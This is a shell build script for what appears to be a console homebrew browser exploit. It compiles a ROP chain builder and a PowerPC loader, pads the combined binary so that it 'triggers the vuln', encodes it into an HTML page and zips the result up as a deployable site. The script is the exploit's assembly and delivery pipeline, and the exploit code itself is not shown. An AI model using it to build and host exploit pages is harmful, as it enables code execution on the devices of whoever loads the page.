rm -rf build site site.zip

mkdir -p build
cd build
gcc -g ../chain_builder.c -o chain_builder
./chain_builder

powerpc-eabi-gcc -m32 -Wall -W -O2 -ffreestanding -mno-eabi -mno-sdata -mcpu=750 -c ../loaderstub.s -o loaderstub.o
powerpc-eabi-ld -T ../loaderstub.lds loaderstub.o -o loaderstub.elf
powerpc-eabi-objcopy -Obinary loaderstub.elf loaderstub.bin

cp -r ../loader .
cd loader
make
cp loader.bin ..
cd ..

cat chain.bin loaderstub.bin loader.bin > final.bin

#dd if=/dev/zero of=hax.bin bs=1 count=131072
dd if=/dev/zero of=hax.bin bs=1 count=122456
echo -e -n "\xFE\xAD\xBE\xEF" >> hax.bin # Force there to be stuff at the end so the computed decmial is large enough to trigger the vuln
dd if=final.bin of=hax.bin conv=notrunc

gcc -g ../multi_tool.c -lgmp -o multi_tool
xxd -p hax.bin | tr -d '\n' > hax.ascii
./multi_tool c hax.ascii output.bin

cp ../index.html .
echo \\ >> output.bin
sed -i '/INSERT_HERE/ {
	r output.bin
	d
}' index.html
mkdir -p ../site/haxs/
cp index.html ../site/haxs/
cp ../payload/payload.png ../site/haxs/
cp ../exp/rd.png ../site/haxs/
cp ../htaccess_redirect ../site/.htaccess
cp ../htaccess_handler ../site/haxs/.htaccess

cd ../site
zip -r -9 ../site.zip .
